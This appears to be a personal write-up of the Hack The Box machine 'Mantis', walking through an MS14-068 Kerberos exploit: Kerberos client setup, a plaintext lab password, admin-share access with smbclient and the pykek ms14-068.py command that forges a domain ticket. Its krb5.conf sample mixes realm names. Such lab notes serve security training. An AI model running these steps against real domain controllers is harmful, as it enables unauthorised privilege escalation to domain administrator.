
We know the OS and will try to find a vulnerability apart from Eternal blue
```
Windows Server 2008 R2 Standard 7601 Service Pack 1 kerberos exploit
```
![[Pasted image 20240516084932.png]]

So the Vulnerability is MS14-68

Will follow this blog 
https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html


Will install the required packages
```
apt-get install krb5-user cifs-utils rdate
```


Will make the changes in the host file
```
10.10.10.52 mantis HTB.local htb mantis.htb.local 
```


Will make changes in the resolv.conf file
```
nano /etc/resolv.conf
```

will make changes to /etc/krb5.conf
```
[libdefaults]
    default_realm = HTB.LOCAL
  
#Edit the realms entry as follows:
[realms]
    LAB.LOCAL = {
        kdc = mantis.htb.local:88
        admin_server = mantis.htb.local
        default_domain = HTB.LOCAL
    }
  
#Also edit the final section:
[domain_realm]
    .domain.internal = HTB.LOCAL
    domain.internal = HTB.LOCAL

```


set the date
```
rdate -n mantis.htb.local
```

will check the configuration if it works or not
```
J@m3s_P@ssW0rd!
```


```
kinit james
```

```
klist
```
![[Pasted image 20240516091939.png]]


```
smbclient -W HTB.LOCAL //MANTIS/c$ -k
```
![[Pasted image 20240516092052.png]]


```
S-1-5-21-4220043660-4019079961-2895681657-1103
```
![[Pasted image 20240516092352.png]]


Now will need to run a code
https://github.com/mubix/pykek.git
clone this repo
```
python2 ms14-068.py -u james@htb.local -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis.htb.local
```

